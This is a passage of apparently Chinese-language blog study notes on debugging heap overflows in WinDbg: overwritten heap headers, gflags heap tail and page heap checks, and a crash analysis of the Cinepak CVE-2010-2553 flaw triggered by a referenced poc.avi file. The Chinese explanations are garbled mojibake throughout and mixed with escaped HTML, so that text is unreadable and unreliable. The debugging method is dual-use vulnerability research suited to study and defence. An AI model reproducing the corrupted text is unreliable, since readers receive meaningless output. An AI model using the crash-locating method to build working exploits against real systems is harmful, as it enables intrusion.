           +0x000 Code1            : 0x1e3938a0
           +0x004 Code2            : 0x81cd
           +0x006 Code3            : 0 &#39;&#39;
           +0x007 Code4            : 0 &#39;&#39;
           +0x000 AgregateCode     : 0x81cd`1e3938a0
           +0x008 FreeList         : _LIST_ENTRY [ 0x8700c4 - 0x8700c4 ]
    åœ¨+04çš„åç§»å¤„çš„å€¼æ˜¯ä¸Šä¸€ä¸ªå †å—çš„å¤§å°,ä¸Šä¸€ä¸ªå †å—çš„å¤§å°åº”è¯¥æ˜¯3,è¿™é‡Œç¡®ä¸æ˜¯,è¯´æ˜dt _heap_free_entryå’Œdt
    _heap_entryåœ¨win7 x64ä½ä¸Šéƒ½å·²ç»ä¸å†æœ‰ç”¨äº†,dt _list_entry 8705a0+8è¿˜æ˜¯å¯ä»¥ç”¨çš„,ä¹Ÿå³_list_entryæ²¡æœ‰å˜,å¦‚ä¸‹:
    dt _list_entry 8705a0+8
        0:000&amp;gt; dt _list_entry 8705a0+8
        ntdll!_LIST_ENTRY
         [ 0x8700c4 - 0x8700c4 ]
           +0x000 Flink            : 0x008700c4 _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]
           +0x004 Blink            : 0x008700c4 _LIST_ENTRY [ 0x8705a8 - 0x8705a8 ]       
    _list_entryå¯ä»¥æ­£å¸¸æ˜¾ç¤º

p
p
p
...
(eip=401084)
    æ­¤å¤„å¯¹åº”çš„æ˜¯å¦‚ä¸‹çš„strcpyçš„å¤åˆ¶è¿‡ç¨‹
    00401084 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
    æ­¤æ—¶æŸ¥çœ‹esiå’Œesiä¸­çš„å†…å®¹å¦‚ä¸‹:
    dd edi
        0:000&amp;gt; dd edi
        00870590  008700c4 008700c4 00000000 00000000
        008705a0  1e3938a0 000081cd 008700c4 008700c4
        008705b0  00000000 00000000 00000000 00000000
        008705c0  00000000 00000000 00000000 00000000
        008705d0  00000000 00000000 00000000 00000000
        008705e0  00000000 00000000 00000000 00000000
        008705f0  00000000 00000000 00000000 00000000
        00870600  00000000 00000000 00000000 00000000
    dd esi
        0:000&amp;gt; dd esi
        0018ff28  41414141 41414141 41414141 41414141
        0018ff38  41414141 41414141 41414141 41414141
        0018ff48  00407000 00401327 00000001 00240f48
        0018ff58  00240f90 00000000 00000000 7efde000
        0018ff68  00000000 00000000 0018ff5c 00000000
        0018ff78  0018ffc4 00402c50 004060b8 00000000
        0018ff88  0018ff94 7563338a 7efde000 0018ffd4
        0018ff98  772f9a02 7efde000 204f7149 00000000
p
(eip=401086)
    æ­¤æ—¶å¤åˆ¶å®Œæˆ,æ­¤æ—¶çš„ç©ºé—²å †å—8705a0(ç´¢å¼•ä¸º8705a8,å †å…¥å£ä¸º8705a0)
    çœ‹çœ‹ç©ºé—²å †å—å˜æˆä»€ä¹ˆäº†
    dt _heap_free_entry 8705a0
        0:000&amp;gt; dt _heap_free_entry 8705a0
        ntdll!_HEAP_FREE_ENTRY
           +0x000 Size             : 0x4141
           +0x002 Flags            : 0x41 &#39;A&#39;
           +0x003 SmallTagIndex    : 0x41 &#39;A&#39;
           +0x000 SubSegmentCode   : 0x41414141 
           +0x004 PreviousSize     : 0x4141
           +0x006 SegmentOffset    : 0x41 &#39;A&#39;
           +0x006 LFHFlags         : 0x41 &#39;A&#39;
           +0x007 UnusedBytes      : 0x41 &#39;A&#39;
           +0x000 FunctionIndex    : 0x4141
           +0x002 ContextValue     : 0x4141
           +0x000 InterceptorValue : 0x41414141
           +0x004 UnusedBytesLength : 0x4141
           +0x006 EntryOffset      : 0x41 &#39;A&#39;
           +0x007 ExtendedBlockSignature : 0x41 &#39;A&#39;
           +0x000 Code1            : 0x41414141
           +0x004 Code2            : 0x4141
           +0x006 Code3            : 0x41 &#39;A&#39;
           +0x007 Code4            : 0x41 &#39;A&#39;
           +0x000 AgregateCode     : 0x41414141`41414141
           +0x008 FreeList         : _LIST_ENTRY [ 0x41414141 - 0x41414141 ]
    8705a0å †å—å¤´ä»¥åŠåé¢çš„FreeListä¸­çš„å‰åå‘æŒ‡é’ˆéƒ½è¢«ä¸Šé¢çš„esiä¸­çš„414141...41è¦†ç›–äº†,å¯æƒ³åé¢å†æ‰§è¡ŒHeapFreeé‡Šæ”¾å·²
    åˆ†é…çš„heapå †å—æ—¶,ä¼šå°†heapå †å—ä¸åé¢çš„ç©ºé—²å †å—8705a0è¿›è¡Œåˆå¹¶,ä¿®æ”¹ä¸¤ä¸ªåˆå¹¶å †å—çš„å‰åå‘æŒ‡é’ˆ,æ­¤æ—¶å°±ä¼šå¼•ç”¨åˆ°
    0x41414141,æœ€åé€ æˆå´©æºƒ.å¦‚æœå°†ä¸Šé¢é‡Šæ”¾å †å—çš„æ“ä½œæ¢æˆåˆ†é…å †å—HeapAlloc(hHeap,0,0x10)ä¹Ÿä¼šå¯¼è‡´å´©æºƒ,å› ä¸ºåœ¨åˆ†é…
    å †å—æ—¶ä¼šå»éå†ç©ºé—²é“¾è¡¨æŒ‡é’ˆ,é€ æˆåœ°å€å¼•ç”¨å¼‚å¸¸.è¿™é‡Œç”±äºåªæ˜¯åˆ†é…äº†ä¸€ä¸ªå †å—(ä»£ç ä¸­ä¸ºHeapAlloc(hHeap,0,0x10)),è¿™
    ä¸€ä¸ªå”¯ä¸€åˆ†é…çš„å †å—åé¢çš„å †å—æ˜¯å‰©ä¸‹çš„ç©ºé—²å †å—,å¦‚æœåˆ†é…å¤šä¸ªå †å—,å…ˆè¢«è¦†ç›–çš„å°±æ˜¯å¤šä¸ªå †å—ä¸­çš„ä¸‹ä¸€ä¸ªå †å—äº†,ä¸€èˆ¬
    ä¸ä¼šè¦†ç›–åˆ°ç©ºé—²å †å—,å¦‚æœç©ºé—²å †å—è¢«è¦†ç›–,è¯´æ˜æ‰€æœ‰çš„å·²åˆ†é…å †å—éƒ½è¢«è¦†ç›–äº†,å› ä¸ºç©ºé—²å †å—åœ¨æ‰€æœ‰å·²åˆ†é…å †å—çš„æœ€å.


åœ¨è¿™é‡Œå¯ä»¥é€šè¿‡å¯¹heapoverflowæ·»åŠ è°ƒè¯•é€‰é¡¹ç”¨äºè¾…åŠ©å †è°ƒè¯•,å¯ä½¿ç”¨windbgæä¾›çš„gflags.exe(ä½äºDebugging Tools for
windowsç›®å½•ä¸‹)æˆ–è€…!gflagå‘½ä»¤è®¾ç½®,ä¸‹é¢æ˜¯å¸¸è§çš„è°ƒè¯•é€‰é¡¹:
    htc:å †å°¾æ£€æŸ¥,åœ¨å †å—æœ«å°¾é™„åŠ é¢å¤–çš„æ ‡è®°ä¿¡æ¯(é€šå¸¸ä¸º8å­—èŠ‚),ä¸”äºæ£€æŸ¥å †å—æ˜¯å¦å‘ç”Ÿæº¢å‡º
    hfc:å †é‡Šæ”¾æ£€æŸ¥,åœ¨é‡Šæ”¾å †å—æ—¶å¯¹å †è¿›è¡Œå„ç§æ£€æŸ¥,é˜²æ­¢å¤šæ¬¡é‡Šæ”¾åŒä¸€ä¸ªå †å—
    hpc:å †å‚æ•°æ£€æŸ¥,å¯¹ä¼ é€’ç»™å †ç®¡ç†çš„å‚æ•°è¿›è¡Œæ›´å¤šçš„æ£€æŸ¥
    ust:ç”¨æˆ·æ€æ ˆå›æº¯,å³å°†æ¯æ¬¡è°ƒç”¨å †å‡½æ•°çš„å‡½æ•°è°ƒç”¨ä¿¡æ¯è®°å½•åˆ°ä¸€ä¸ªæ•°æ®åº“ä¸­
    htg:å †æ ‡å¿—,ä¸ºå †å—æ·»åŠ é™„åŠ æ ‡è®°,ä»¥è®°å½•å †å—çš„ä½¿ç”¨æƒ…å†µæˆ–å…¶ä»–ä¿¡æ¯
    hvc:è°ƒç”¨æ—¶éªŒè¯,å³æ¯æ¬¡è°ƒç”¨å †å‡½æ•°æ—¶éƒ½å¯¹æ•´ä¸ªå †è¿›è¡ŒéªŒè¯å’Œæ£€æŸ¥
    hpa:å¯ç”¨é¡µå †,åœ¨å †å—åå¢åŠ ä¸“é—¨ç”¨äºæ£€æµ‹æº¢å‡ºçš„æ …æ é¡µ,è‹¥å‘ç”Ÿå †æº¢å‡ºè§¦åŠæ …æ é¡µä¾¿ä¼šç«‹åˆ»è§¦å‘å¼‚å¸¸

    ä½¿ç”¨æ–¹æ³•:
    eg.åœ¨windbgå‘½ä»¤ä¸­è¾“å…¥:(win7éœ€è¦ç®¡ç†å‘˜èº«ä»½)
            !gflag -i app.exe +htc +hpa -htg
       åœ¨cmdä¸­è¾“å…¥:(win7éœ€è¦ç®¡ç†å‘˜èº«ä»½)
            gflags -i app.exe +htc +hpa -htg
ä¸€èˆ¬å †å°¾æ£€æŸ¥ä¸»è¦æ˜¯åœ¨æ¯ä¸ªå †å—çš„å°¾éƒ¨,å³ç”¨æˆ·æ•°æ®ä¹‹åæ·»åŠ 8å­—èŠ‚å†…å®¹,é€šå¸¸ä¸ºè¿ç»­çš„2ä¸ª0xabababab,å¦‚æœè¯¥æ®µæ•°æ®è¢«ç ´åå°±
è¯´æ˜å¯èƒ½å­˜åœ¨å †æº¢å‡º.è¿™é‡Œåœ¨heapoverflow.exeä¸­å¼€å¯htcå’Œhpc,å…·ä½“è¿‡ç¨‹å¦‚ä¸‹:

windbgä¸­ctrl+eé€‰æ‹©heapoverflow.exe
    ä¹Ÿå³windbgåŠ è½½heapoverflow.exe,å¦‚æœæ˜¯é™„åŠ è€Œä¸æ˜¯åŠ è½½,å°±æ— æ³•åœ¨å †å°¾æ·»åŠ é¢å¤–çš„æ ‡è®°ä¿¡æ¯,å³æ— æ³•è¿›è¡Œå †å°¾æ£€æŸ¥
!gflag +htc +hpc
    0:000&amp;gt; !gflag +hpc +htc
    New NtGlobalFlag contents: 0x00000050
        htc - Enable heap tail checking
        hpc - Enable heap parameter checking
g
    åœ¨windbgä¸­è¾“å…¥g,å¹¶åœ¨heapoverflow.exeçª—å£ä¸­éšæ„è¾“å…¥å­—ç¬¦å¹¶å›è½¦,ç»“æœå¦‚ä¸‹:
        0:000&amp;gt; g
        HEAP[heapoverflow.exe]: Heap block at 007C0588 modified at 007C05A0 past requested size of 10
        (1b4.11c0): Break instruction exception - code 80000003 (first chance)
        eax=007c0588 ebx=007c05a0 ecx=7733418f edx=0018fb15 esi=007c0588 edi=00000010
        eip=7739152c esp=0018fd5c ebp=0018fd5c iopl=0         nv up ei pl nz na po nc
        cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
        ntdll!RtlpBreakPointHeap+0x23:
        7739152c cc              int     3
    ç»“æœä¸­çš„heap block at 7c0588 modified at 7c05a0 past requested size of 10çš„æ„æ€æ˜¯åœ¨å †å—7c0588ä¸­,æœ‰ä¸ªåœ°å€
    7c05a0è¢«ä¿®æ”¹,å› ä¸ºè¶…è¿‡äº†åŸæ¥ç”³è¯·çš„10ä¸ªå­—èŠ‚å¤§å°.è¿™é‡Œå®é™…åˆ†é…äº†24ä¸ªå­—èŠ‚å¤§å°,æ­£å¥½æ˜¯7c05a0-7c0588=0x18çš„å€¼

é€šè¿‡è¿™é‡Œçš„è°ƒè¯•ä¿¡æ¯,å¤§ä½“å¯ä»¥åˆ¤æ–­å‡ºå †æº¢å‡ºä¸»è¦æ˜¯ç”±äºå‘å¤§å°ä¸º0x10çš„å †ä¸­å¤åˆ¶äº†è¿‡å¤šçš„æ•°æ®å¯¼è‡´çš„,ä½†æ˜¯å¹¶ä¸èƒ½å®šä½åˆ°å¯¼è‡´
æ¼æ´çš„æ±‡ç¼–æŒ‡ä»¤,æ¯”å¦‚å¯¼è‡´å †æº¢å‡ºçš„å­—èŠ‚å¤åˆ¶æŒ‡ä»¤rep movszç­‰,è€Œè¿™é‡Œçš„å †å°¾æ£€æŸ¥æ–¹å¼ä¸»è¦æ˜¯å †è¢«ç ´ååçš„åœºæ™¯,ä¸åˆ©äºå®šä½
å¯¼è‡´æ¼æ´çš„ä»£ç ,å¯ä»¥é€šè¿‡ä½¿ç”¨é¡µå †è°ƒè¯•é€‰é¡¹å®šä½æ¼æ´æŒ‡ä»¤,å…·ä½“å¦‚ä¸‹æ“ä½œ:

windbgåŠ è½½heapoverflow.exe
!gflag +hpa
    0:000&amp;gt; !gflag +hpa
    New NtGlobalFlag contents: 0x02000000
        hpa - Place heap allocations at ends of pages
g
    åœ¨windbgä¸­è¾“å…¥g,å¹¶å­˜heapoverflow.exeä¸­è¾“å…¥ä»»æ„å­—ç¬¦å¹¶å›è½¦,ç»“æœå¦‚ä¸‹:
        0:000&amp;gt; g
        (1074.e3c): Access violation - code c0000005 (first chance)
        First chance exceptions are reported before any exception handling.
        This exception may be expected and handled.
        eax=002705a8 ebx=00000000 ecx=41414141 edx=00270590 esi=00270588 edi=00270000
        eip=772f2fe5 esp=0018fdf0 ebp=0018fed0 iopl=0         nv up ei ng nz na po cy
        cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010283
        ntdll!RtlpFreeHeap+0x4d6:
        772f2fe5 8b19            mov     ebx,dword ptr [ecx]  ds:002b:41414141=????????

kb
    0:000&amp;gt; kb
    ChildEBP RetAddr  Args to Child              
    0018fed0 772f2ce5 00270588 00270590 0018ff49 ntdll!RtlpFreeHeap+0x4d6
    0018fef0 756314bd 00270000 00000000 00270590 ntdll!RtlFreeHeap+0x142
    *** WARNING: Unable to verify checksum for image00400000
    *** ERROR: Module load completed but symbols could not be loaded for image00400000
    WARNING: Stack unwind information not available. Following frames may be wrong.
    0018ff04[00401094] 00270000 00000000 00270590 kernel32!HeapFree+0x14
    0018ff48[00401327]00000001 00540fe8 00541030 image00400000+0x1094
    0018ff88 7563338a 7efde000 0018ffd4 772f9a02 image00400000+0x1327
    0018ff94 772f9a02 7efde000 2fab3393 00000000 kernel32!BaseThreadInitThunk+0x12
    0018ffd4 772f99d5 00401273 7efde000 00000000 ntdll!__RtlUserThreadStart+0x70
    0018ffec 00000000 00401273 7efde000 00000000 ntdll!_RtlUserThreadStart+0x1b

    å…¶ä¸­kbæœ€åä¸€åˆ—ç»“æœä¸ºkbå‘½ä»¤æ‰§è¡Œçš„ç»“æœä¸­çš„å½“å‰æ’çš„ä¸Šä¸€æ’ä¸­çš„RetAddrçš„å€¼
ub image00400000+0x1094
    0:000&amp;gt; ub image00400000+0x1094
    image00400000+0x107f:
    0040107f 6a00            push    0
    00401081 c1e902          shr     ecx,2
    00401084 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
    00401086 8bc8            mov     ecx,eax
    00401088 55              push    ebp
    00401089 83e103          and     ecx,3
    0040108c f3a4            rep movs byte ptr es:[edi],byte ptr [esi]
    0040108e ff1504604000    call    dword ptr [image00400000+0x6004 (00406004)]

ub image00400000+0x1327
    0:000&amp;gt; ub image00400000+0x1327
    image00400000+0x1301:
    00401301 e847120000      call    image00400000+0x254d (0040254d)
    00401306 e8af0e0000      call    image00400000+0x21ba (004021ba)
    0040130b a150994000      mov     eax,dword ptr [image00400000+0x9950 (00409950)]
    00401310 a354994000      mov     dword ptr [image00400000+0x9954 (00409954)],eax
    00401315 50              push    eax
    00401316 ff3548994000    push    dword ptr [image00400000+0x9948 (00409948)]
    0040131c ff3544994000    push    dword ptr [image00400000+0x9944 (00409944)]
    00401322 e8d9fcffff      call    image00400000+0x1000 (00401000)

    ä¹Ÿå³ç¨‹åºå¼‚å¸¸æ—¶æ˜¯ç”±äº40108eå¤„çš„call 406004è¿™æ¡æ±‡ç¼–æŒ‡ä»¤å‡ºäº†é—®é¢˜,è€Œcall 406004è¿™å¥æŒ‡ä»¤æ‰€åœ¨çš„å‡½æ•°å¸§æ‰§æ˜¯401000
    å‡½æ•°å¸§.å› ä¸ºæ ˆä¸­å‹å…¥çš„ä¸¤ä¸ª&quot;è¿”å›åˆ°&quot;çš„åœ°å€åˆ†åˆ«ä¸º401094å’Œ401327,è€Œä¹‹æ‰€ä»¥ä¼šå‹å…¥401094æ˜¯å› ä¸ºå·²ç»æ‰§è¡Œåˆ°äº†40108eå¤„
    çš„call 406004ä¸­çš„406004å‡½æ•°å¸§ä¸­çš„æŒ‡ä»¤,ä½†æ˜¯4006004å‡½æ•°å¸§åœ¨æ²¡æœ‰è¿”å›ä¹‹å‰å¼‚å¸¸äº†,è¯´æ˜401084å¤„å¯¹åº”çš„strcpyå·²ç»æ‰§
    è¡Œå®Œæˆ,ä¹Ÿå³heapå †å·²ç»è¢«è¦†ç›–,è¿™é‡Œä¸ã€Šæ¼æ´æˆ˜äº‰ã€‹ä¹¦ä¸­ä¸åŒ,ä¹¦ä¸­å†™çš„æ˜¯æ²¡æœ‰è¦†ç›–,ä¸ºäº†ç¡®å®šå·²åˆ†é…çš„heapå †æ˜¯å¦è¢«
    è¦†ç›–,æ‰§è¡Œå¦‚ä¸‹æ“ä½œæŸ¥çœ‹:

    !heap
        0:000&amp;gt; !heap
        Details:
        Error address: 002705a0
        Heap handle: 00270000
        Error type heap_failure_buffer_overrun (6)
        Last known valid blocks: before - 00270588, after - 00270fe0
        Stack trace:
                        7734acd3: ntdll!RtlpCoalesceFreeBlocks+0x0000084c
                        772f2dfa: ntdll!RtlpFreeHeap+0x000001f4
                        772f2ce5: ntdll!RtlFreeHeap+0x00000142
                        756314bd: kernel32!HeapFree+0x00000014
        Index   Address  Name      Debugging options enabled
          1:   005a0000                
          2:   00540000                
          3:   00270000   
    !heap -h 270000
        Heap entries for Segment00 in Heap 00270000
            00270000: 00000 . 00588 [101] - busy (587)
            00270588: 00588 . 00018 [00]                                   ===&amp;gt;å¯¹åº”åˆ†é…çš„heapå †å—
            002705a0: 41728 . 20a08 [41] - busy (1c8c7), user flags (2)    ===&amp;gt;å¯¹åº”ç©ºè¡¨å¯¹åº”çš„ç©ºé—²å †å—
        è¿™é‡Œæœ‰ç‚¹å¼‚å¸¸ç°è±¡,ä¸€èˆ¬æ¥è¯´æœ€åä¸€ä¸ªå †å—å…¥å£æ˜¯ç©ºè¡¨å¯¹åº”çš„ç©ºé—²å †å—,è¿™é‡Œ&quot;ç©ºé—²å †å—&quot;å´å˜æˆäº†å ç”¨æ€,è€Œåˆ†é…çš„
        heapå †å—å˜æˆäº†&quot;ç©ºé—²&quot;æ€
    dd 270588
        0:000&amp;gt; dd 270588
        00270588  02000003 0000c315 41414141 41414141
        00270598  41414141 41414141 41414141 41414141
        002705a8  41414141 41414141 00000000 00000000
        002705b8  00000000 00000000 00000000 00000000
        002705c8  00000000 00000000 00000000 00000000
        002705d8  00000000 00000000 00000000 00000000
        002705e8  00000000 00000000 00000000 00000000
        002705f8  00000000 00000000 00000000 00000000
        è¿™é‡Œçœ‹å‡ºåˆ†é…çš„heapå †å—çš„ç¡®å·²ç»è¢«è¦†ç›–äº†è¶…è¿‡0x10é•¿åº¦çš„A
    dd 2705a0
        0:000&amp;gt; dd 2705a0
        002705a0  41414141 41414141 41414141 41414141
        002705b0  00000000 00000000 00000000 00000000
        002705c0  00000000 00000000 00000000 00000000
        002705d0  00000000 00000000 00000000 00000000
        002705e0  00000000 00000000 00000000 00000000
        002705f0  00000000 00000000 00000000 00000000
        00270600  00000000 00000000 00000000 00000000
        00270610  00000000 00000000 00000000 00000000
        è¿™é‡Œç»“åˆä¸Šé¢çš„dd 270588çš„ç»“æœå¯ä»¥çœ‹å‡º,ä¸Šé¢åˆ†é…çš„å †å—è¢«è¦†ç›–,ä¸”å¤šä½™çš„Aè¦†ç›–äº†ç©ºé—²å †å—çš„å—é¦–å’ŒflinkåŠ
        blink,è¯´æ˜çš„ç¡®æ˜¯è¦†ç›–äº†çš„,åªæ˜¯å°±ç®—è¦†ç›–äº†ç©ºé—²å †å—,ä¾ç„¶èƒ½ç”¨!gflag +hpaå®šä½æ¼æ´æŒ‡ä»¤,è€Œä¹‹æ‰€ä»¥æ²¡æœ‰å’Œä¹¦ä¸­è¯´
        çš„æ²¡æœ‰è¦†ç›–åé¢çš„ç©ºé—²å †å—ä¸åŒ,å¤§æ¦‚æ˜¯å’Œä½œè€…çš„æ“ä½œç³»ç»Ÿä¸åŒå¯¼è‡´(è¿™é‡Œç”¨çš„æ˜¯win7 x64,ä¹¦ä¸­åªè¯´æ˜¯win7),æˆ–è€…
        æ˜¯å…¶ä»–åŸå› .
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-cve-2010-2553&quot;&gt;0x02 cve-2010-2553åˆ†æ&lt;/h3&gt;

&lt;h4 id=&quot;x01-about&quot;&gt;0x01 about&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;æ¼æ´æè¿°:
    Cinepakè§†é¢‘ç¼–è§£ç å™¨ä¸­çš„iccvid.dllä¸­çš„CVDecompresså‡½æ•°åœ¨è§£å‹ç¼©åª’ä½“æ–‡ä»¶æ—¶æ²¡æœ‰å¯¹ç¼“å†²åŒºå¤§å°è¿›è¡Œæ£€æµ‹,å¯¼è‡´åœ¨å¤åˆ¶
    å‹ç¼©æ•°æ®æ—¶é€ æˆå †æº¢å‡º

å®éªŒç¯å¢ƒ:
    win xp sp3
    windows media player
    turbodiff v1.01b
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x02-&quot;&gt;0x02 è°ƒè¯•åˆ†æ&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;attention

    ä¹¦ä¸­p86é¡µä¸­çš„å¼€å¯é¡µå †çš„æ–¹æ³•æ˜¯å…ˆè¿è¡Œwmplayer.exe,windbgé™„åŠ è¿›ç¨‹åå†åœ¨windbgçš„å‘½ä»¤è¾“å…¥æ¡†ä¸­è¾“å…¥!gflag +hpa,å®
    é™…æ“ä½œä¸­ä¼šæç¤ºä¸èƒ½æˆåŠŸ,å³é”®ä»¥ç®¡ç†èº«ä»½è¿è¡Œä»ç„¶ä¸æˆåŠŸ,å¯èƒ½æ˜¯win xpæˆ–è€…æ˜¯windbgå’Œä¹¦ä¸­ä½œè€…çš„æœ‰ä¸€ç‚¹ä¸åŒæˆ–å…¶ä»–åŸ
    å› ,ä¸è¿‡èƒ½é€šè¿‡cmdä¸­gflags.exe -i wmplayer.exe +hpaæˆåŠŸè®¾ç½®é¡µå †,ä¹¦ä¸­p80ä¸­è¯´çš„åªèƒ½åŠ è½½exeå†åœ¨windbgä¸­è®¾ç½®è°ƒè¯•
    é€‰é¡¹ä¼¼ä¹ä¸p86æœ‰çŸ›ç›¾,ä¸è¿‡p80ä¸­æ˜¯è®¾ç½®çš„å †å°¾çš„è°ƒè¯•é€‰é¡¹,è¿™é‡Œæš‚ä¸”è®¤ä¸º:

        a&amp;gt;å †å°¾åªèƒ½ç”¨p80è¯´çš„windbgåŠ è½½æœªè¿è¡Œçš„exeåå†é€šè¿‡windbfè®¾ç½®!gflag +htc +hpcå®ç°
        b&amp;gt;é¡µå †å¯ä»¥ç”¨p86è¯´çš„windbgé™„åŠ å·²ç»è¿è¡Œçš„exeåå†è®¾ç½®!gflag +hpaå®ç°
        c&amp;gt;å®é™…æ“ä½œä¸­å¯èƒ½ç”±äºç¯å¢ƒé—®é¢˜åœ¨æœ¬æœºçš„win xp sp3ä¸Šåªèƒ½é€šè¿‡ç³»ç»Ÿcmdæ‰§è¡Œgflag.exe -i wmplayer.exe +hpa,è¿è¡Œ
          wmplayer.exe,å†ç”¨windbgé™„åŠ exeè¿›ç¨‹å®ç°,è€Œè¿™ç§æ–¹æ³•åº”è¯¥æ˜¯ç›¸å½“äºaä¸­çš„windbgåŠ è½½çš„æ–¹æ³•

2&amp;gt;æ“ä½œ

win+r:cmd
gflags.exe -i &quot;C:\Program Files\Windows Media Player\wmplayer.exe&quot; +hpa
    Current Registry Settings for wmplayer.exe executable are: 02000000
    hpa - Enable page heap
    è¿™é‡Œæ²¡æœ‰ç”¨ç®¡ç†å‘˜å®Œå…¨èº«ä»½è¿è¡Œcmdä¹Ÿå¯ä»¥æˆåŠŸ

åŒå‡»wmplayer.exe
windbgé™„åŠ wmplayer.exe
!gflag
    0:003&amp;gt; !gflag
    Current NtGlobalFlag contents: 0x02000000
    hpa - Place heap allocations at ends of pages
    windbgä¸­æ£€æŸ¥çš„ç¡®æˆåŠŸè®¾ç½®äº†hpa

g
wmplayer.exeçª—å£ä¸­æ‰“å¼€poc.avi(é…å¥—èµ„æ–™)
    (2e8.644): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=00006000 ebx=07d86fc0 ecx=00000800 edx=07a3fd38 esi=10279000 edi=1027b000
    eip=73b722cc esp=07a3fd04 ebp=07a3fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
    iccvid!CVDecompress+0x11e:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:1027b000=???????? 
    ds:0023:10279000=00930093

kb
    0:010&amp;gt; kb
    ChildEBP RetAddr  Args to Child              
    07a3fd30 73b7cbf3 00000004 00000000 00000068 iccvid!CVDecompress+0x11e
    07a3fd60 73b766c8 07e0ef60 00000000 07e24fd8 iccvid!Decompress+0x11d
    07a3fdac 73b41938 07e0ef60 00000001 0000400d iccvid!DriverProc+0x1bf
    07a3fdd0 7cf8fa9e 73b5b500 0000400d 07a3fde8 MSVFW32!ICSendMessage+0x2b
    07a3fe00 7cf8f9e9 73b5b500 00000000 07e24fd8 quartz!CVFWDynLink::ICDecompress+0x3e
    07a3fec0 7cf90a55 07cf6fa8 06daac90 00000000 quartz!CAVIDec::Transform+0x282
    07a3feec 7cf90939 07cf6fa8 00000000 06dfaee0 quartz!CVideoTransformFilter::Receive+0x110
    07a3ff00 7cf8e67a 0802cf44 07cf6fa8 07a3ff40 quartz!CTransformInputPin::Receive+0x33
    07a3ff10 7cf90ca0 07cf6fa8 00040103 06dfaee0 quartz!CBaseOutputPin::Deliver+0x22
    07a3ff40 7cf90e1c 07a3ff70 07a3ff6c 7c984d69 quartz!CBaseMSRWorker::TryDeliverSample+0x102
    07a3ff84 7cf8ce30 7c984d69 06dfaee0 06dfaee0 quartz!CBaseMSRWorker::PushLoop+0x15e
    07a3ff9c 7cf8dbe6 00000000 7cf8a121 7c984d69 quartz!CBaseMSRWorker::DoRunLoop+0x4a
    07a3ffa4 7cf8a121 7c984d69 00000010 07a3ffec quartz!CBaseMSRWorker::ThreadProc+0x39
    07a3ffb4 7c80b713 06dfaee0 7c984d69 00000010 quartz!CAMThread::InitialThreadProc+0x15
    07a3ffec 00000000 7cf8a10c 06dfaee0 00000000 kernel32!BaseThreadStart+0x37


ub 73b7cbf3
æˆ–è€…
ub iccvid!Decompress+0x11d
    0:010&amp;gt; ub iccvid!Decompress+0x11d
    iccvid!Decompress+0x102:
    73b7cbd8 ffb698000000    push    dword ptr [esi+98h]
    73b7cbde 57              push    edi
    73b7cbdf ff7528          push    dword ptr [ebp+28h]
    73b7cbe2 ff752c          push    dword ptr [ebp+2Ch]
    73b7cbe5 ff7530          push    dword ptr [ebp+30h]
    73b7cbe8 ff7514          push    dword ptr [ebp+14h]
    73b7cbeb ff765c          push    dword ptr [esi+5Ch]
    73b7cbee e8bb55ffff      call    iccvid!CVDecompress (73b721ae)

ub 73b766c8
æˆ–è€…
ub iccvid!DriverProc+0x1bf
    0:010&amp;gt; ub iccvid!DriverProc+0x1bf
    iccvid!DriverProc+0x1ae:
    73b766b7 52              push    edx
    73b766b8 51              push    ecx
    73b766b9 51              push    ecx
    73b766ba ff7008          push    dword ptr [eax+8]
    73b766bd ff7004          push    dword ptr [eax+4]
    73b766c0 ff30            push    dword ptr [eax]
    73b766c2 56              push    esi
    73b766c3 e80e640000      call    iccvid!Decompress (73b7cad6)

    è¿™é‡Œå¯¹æ ˆä¸­æœ€è¿‘çš„ä¸¤ä¸ªè¿”å›åœ°å€ä»¥ä¸Šéƒ¨åˆ†è¿›è¡Œåæ±‡ç¼–,é€šè¿‡ä¸Šé¢ç»“æœå¯ä»¥çœ‹å‡º:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:1027b000=???????? 
    ds:0023:10279000=00930093 è¿™é‡Œå¼‚å¸¸æ—¶eip=73b722ccæ˜¯å±äºå‡½æ•°73b721aeä¸­çš„ä¸€å¥æŒ‡ä»¤,è€Œ73b7cbeeå¤„çš„call 73b721ae
    è¿™ä¸€æ¡æŒ‡ä»¤æ‰€åœ¨çš„å‡½æ•°å¸§æ­£æ˜¯73b7cad6å‡½æ•°å¸§,å¯é€šè¿‡æŸ¥çœ‹|åˆ†è§£|Offset:73b721aeéªŒè¯

ç°åœ¨éœ€è¦åœ¨73b7cbeeå¤„ä¸‹æ–­ç‚¹,ä½†æ˜¯iccvid.dllåªæœ‰åœ¨wmplayer.exeæ‰“å¼€poc.aviæ—¶æ‰åŠ è½½,è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•å®ç°ä¸‹æ–­:
    a&amp;gt;åœ¨odæˆ–immunity debuggerä¸­å•ç‹¬åŠ è½½iccvid.dll,å¹¶åœ¨73b7cbeeä¸Šä¸‹æ–­ç‚¹åå†ç”¨odæˆ–immunity debuggeré™„åŠ 
      wmplayer.exeè¿›è¡Œåˆ†æ
    b&amp;gt;åœ¨windbgä¸­é‡æ–°é™„åŠ wmplayer.exe,å¹¶æ‰§è¡Œsxe ld:iccvid.dll,ä¹Ÿå³åœ¨iccvid.dllç¬¬ä¸€æ¬¡è¢«åŠ è½½çš„æ—¶å€™ä¸­æ–­,ä¸­æ–­åå†åœ¨
      windbgä¸­æ‰§è¡Œbp 73b7cbee

